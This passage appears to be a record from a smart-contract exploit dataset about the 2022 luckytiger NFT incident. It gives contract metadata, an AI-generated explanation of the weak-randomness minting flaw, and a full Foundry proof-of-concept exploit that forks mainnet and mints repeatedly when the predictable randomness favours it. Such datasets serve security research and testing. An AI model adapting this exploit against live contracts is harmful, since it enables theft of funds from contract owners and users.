d8ac8968e9b2c80c0967", "artifact_dir": "data/contracts/2022_08_luckytiger/contracts/01_vulnerable_9c87a572_luckytiger", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.16+commit.07a7930e", "contract_name": "luckytiger", "explorer_url": "https://etherscan.io/address/0x9c87a5726e98f2f404cdd8ac8968e9b2c80c0967", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:39:44.454Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2022_08_luckytiger/contracts/01_vulnerable_9c87a572_luckytiger/source.sol"], "source_hint": "AI extracted: The `luckyHack` contract exploits the `NFT` contract by repeatedly calling its `publicMint()` function. The `NFT` contract's minting logic is vulnerable because it relies on a predictable pseudo-random number generator based on `block.difficulty` and `block.timestamp`. The attacker can manipulate these values by forking the blockchain and controlling the block number and timestamp, allowing them to consistently predict the outcome of `getRandom()` and ensure the minting condition is met. This leads to an unlimited minting vulnerability.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2022_08_luckytiger", "id": "2022_08_luckytiger", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:39:46.585Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/*
    Attacker: 0x3392c91403f09ad3b7e7243dbd4441436c7f443c
    Attack tx: https://etherscan.io/tx/0x804ff3801542bff435a5d733f4d8a93a535d73d0de0f843fd979756a7eab26af
    poc refers to: https://github.com/0xNezha/luckyHack
*/

interface NFT {
    function balanceOf(
        address _owner
    ) external view returns (uint256 balance);
}

contract luckyHack is Test {
    event Log(string);

    address owner = address(this);
    address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_403_430); // fork mainnet block number 15403430
        vm.deal(address(this), 3 ether);
        vm.deal(address(nftAddress), 5 ether);
    }

    function getRandom() public view returns (uint256) {
        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
            return 0;
        } else {
            return 1;
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function testExploit() public {
        vm.warp(1_661_351_167);
        console.log("getRandom", getRandom());

        uint256 amount = 10;

        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
            revert("Not lucky");
        }
        bytes memory data = abi.encodeWithSignature("publicMint()");

        for (uint256 i = 0; i < amount; ++i) {
            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);
            if (!status) {
                revert("error");
            } else {
                emit Log("success");
            }
        }

        console.log("NFT we got:", NFT(nftAddress).balanceOf(address(this)));
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
